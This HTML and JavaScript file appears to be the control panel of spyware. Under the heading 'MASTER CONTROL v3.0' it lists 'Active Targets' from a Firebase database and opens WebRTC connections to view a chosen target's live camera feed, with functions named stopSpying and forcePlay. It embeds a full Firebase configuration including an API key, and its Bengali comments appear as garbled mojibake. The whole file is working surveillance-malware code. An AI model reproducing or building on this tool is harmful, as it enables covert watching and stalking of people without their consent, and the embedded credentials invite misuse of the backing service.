<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">

    <style>
        body { background: #0f0f0f; color: white; font-family: 'Courier New', monospace; padding: 20px; }
        h2 { color: #00ffcc; text-align: center; border-bottom: 2px solid #333; padding-bottom: 10px; }
        
        #userList { list-style: none; padding: 0; }
        .user-card { 
            background: #1a1a1a; padding: 15px; margin: 10px 0; border-radius: 5px; 
            cursor: pointer; display: flex; justify-content: space-between; 
            border: 1px solid #333; transition: 0.3s; 
        }
        .user-card:hover { background: #252525; border-color: #00ffcc; transform: translateX(5px); }
        .online { background: #00ffcc; color: black; padding: 2px 8px; border-radius: 10px; font-weight: bold; }
        
        /* ‡¶≠‡¶ø‡¶°‡¶ø‡¶ì ‡¶ï‡¶®‡ßç‡¶ü‡ßá‡¶á‡¶®‡¶æ‡¶∞ */
        #videoContainer { 
            display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; 
            background: rgba(0,0,0,0.96); z-index: 999; text-align: center; padding-top: 40px; 
        }
        
        /* ‡¶≠‡¶ø‡¶°‡¶ø‡¶ì ‡¶∏‡ßç‡¶ü‡¶æ‡¶á‡¶≤ */
        video { 
            width: 95%; max-width: 600px; 
            border: 3px solid #00ffcc; border-radius: 10px; 
            box-shadow: 0 0 30px rgba(0,255,204,0.4); 
            background: black;
        }

        .btn-close { padding: 10px 20px; background: red; color: white; border: none; font-weight: bold; margin-top: 15px; cursor: pointer; }
        
        /* üî• ‡¶™‡ßç‡¶≤‡ßá ‡¶¨‡¶æ‡¶ü‡¶® ‡¶∏‡ßç‡¶ü‡¶æ‡¶á‡¶≤ */
        #playBtn {
            display: none; /* ‡¶∂‡ßÅ‡¶∞‡ßÅ‡¶§‡ßá ‡¶≤‡ßÅ‡¶ï‡¶æ‡¶®‡ßã ‡¶•‡¶æ‡¶ï‡¶¨‡ßá */
            padding: 15px 30px; background: #00ffcc; color: black; 
            font-size: 18px; font-weight: bold; border: none; border-radius: 5px;
            margin-top: 20px; cursor: pointer; animation: pulse 1.5s infinite;
        }
        @keyframes pulse { 0% { transform: scale(1); } 50% { transform: scale(1.05); } 100% { transform: scale(1); } }

        #installBtn { display: none; width: 100%; padding: 10px; background: #333; color: #00ffcc; border: 1px dashed #00ffcc; cursor: pointer; }
    </style>
</head>
<body>

    <button id="installBtn" onclick="installApp()">üì≤ INSTALL SYSTEM APP</button>

    <h2>üïµÔ∏è MASTER CONTROL v3.0</h2>
    <h3>Active Targets:</h3>
    <ul id="userList"></ul>

    <div id="videoContainer">
        <h3 id="targetName" style="color: #00ffcc;">Connecting...</h3>
        
        <video id="remoteVideo" playsinline controls></video>
        
        <br>
        <button id="playBtn" onclick="forcePlay()">‚ñ∂ VIEW LIVE FEED</button>
        <br>
        
        <button class="btn-close" onclick="stopSpying()">DISCONNECT</button>
    </div>

    <script>
        const firebaseConfig = {
          apiKey: "AIzaSyBy5AGDGQFZqbL83fKQfLViX_pyOu6AJ38",
          authDomain: "phone-f605e.firebaseapp.com",
          databaseURL: "https://phone-f605e-default-rtdb.firebaseio.com",
          projectId: "phone-f605e",
          storageBucket: "phone-f605e.firebasestorage.app",
          messagingSenderId: "902490805880",
          appId: "1:902490805880:web:98a5ed1432a0e3538e3f8d",
          measurementId: "G-WSJDCYKM3F"
        };

        if (!firebase.apps.length) firebase.initializeApp(firebaseConfig);
        const db = firebase.database();
        let currentPeer = null;
        let currentTargetId = null;

        // PWA Install
        let deferredPrompt;
        const installBtn = document.getElementById('installBtn');
        window.addEventListener('beforeinstallprompt', (e) => {
            e.preventDefault();
            deferredPrompt = e;
            installBtn.style.display = 'block';
        });
        function installApp() {
            if (deferredPrompt) {
                deferredPrompt.prompt();
                deferredPrompt.userChoice.then((res) => {
                    if (res.outcome === 'accepted') installBtn.style.display = 'none';
                    deferredPrompt = null;
                });
            }
        }
        if ('serviceWorker' in navigator) navigator.serviceWorker.register('./sw.js');

        // User List
        db.ref("users").on("value", snapshot => {
            const list = document.getElementById("userList");
            list.innerHTML = "";
            snapshot.forEach(child => {
                const uid = child.key;
                const data = child.val();
                const isOnline = data.status === "online";
                const li = document.createElement("li");
                li.className = "user-card";
                li.innerHTML = `<span>üë§ ${data.email.split('@')[0]}</span> <span class="online" style="background:${isOnline?'#00ffcc':'#555'}">${isOnline?'ONLINE':'OFFLINE'}</span>`;
                if(isOnline) li.onclick = () => prepareConnection(uid, data.email);
                list.appendChild(li);
            });
        });

        function prepareConnection(uid, email) {
            document.getElementById("videoContainer").style.display = "block";
            document.getElementById("targetName").innerText = "Handshaking with " + email + "...";
            document.getElementById("playBtn").style.display = "none"; // ‡¶¨‡¶æ‡¶ü‡¶® ‡¶∞‡¶ø‡¶∏‡ßá‡¶ü
            currentTargetId = uid;
            
            db.ref("users/" + uid + "/offer").remove();
            db.ref("users/" + uid + "/answer").remove().then(() => startWebRTC(uid));
        }

        function startWebRTC(targetId) {
            currentPeer = new SimplePeer({ 
                initiator: true, 
                trickle: false, 
                config: { iceServers: [{ urls: 'stun:stun.l.google.com:19302' }] } 
            });

            currentPeer.on('signal', offer => db.ref("users/" + targetId + "/offer").set(offer));

            db.ref("users/" + targetId + "/answer").on("value", snapshot => {
                if (snapshot.val() && currentPeer) currentPeer.signal(snapshot.val());
            });

            currentPeer.on('stream', stream => {
                const video = document.getElementById("remoteVideo");
                video.srcObject = stream;
                
                // üî• ‡¶≠‡¶ø‡¶°‡¶ø‡¶ì ‡¶ï‡¶æ‡¶®‡ßá‡¶ï‡ßç‡¶ü ‡¶π‡¶≤‡ßá ‡¶¨‡¶æ‡¶ü‡¶® ‡¶¶‡ßá‡¶ñ‡¶æ‡¶¨‡ßá
                document.getElementById("targetName").innerText = "‚úÖ CONNECTED! CLICK PLAY";
                document.getElementById("playBtn").style.display = "inline-block";
            });

            currentPeer.on('error', err => { alert("Connection Failed"); stopSpying(); });
        }

        // üî• ‡¶Æ‡ßç‡¶Ø‡¶æ‡¶®‡ßÅ‡ßü‡¶æ‡¶≤ ‡¶™‡ßç‡¶≤‡ßá ‡¶´‡¶æ‡¶Ç‡¶∂‡¶®
        function forcePlay() {
            const video = document.getElementById("remoteVideo");
            video.play().then(() => {
                document.getElementById("playBtn").style.display = "none"; // ‡¶™‡ßç‡¶≤‡ßá ‡¶π‡¶≤‡ßá ‡¶¨‡¶æ‡¶ü‡¶® ‡¶ó‡¶æ‡ßü‡ßá‡¶¨
            }).catch(e => alert("Play Error: " + e));
        }

        function stopSpying() {
            if (currentPeer) currentPeer.destroy();
            currentPeer = null;
            if (currentTargetId) {
                db.ref("users/" + currentTargetId + "/offer").remove();
                db.ref("users/" + currentTargetId + "/answer").remove();
            }
            document.getElementById("videoContainer").style.display = "none";
            location.reload();
        }
    </script>
</body>
</html>
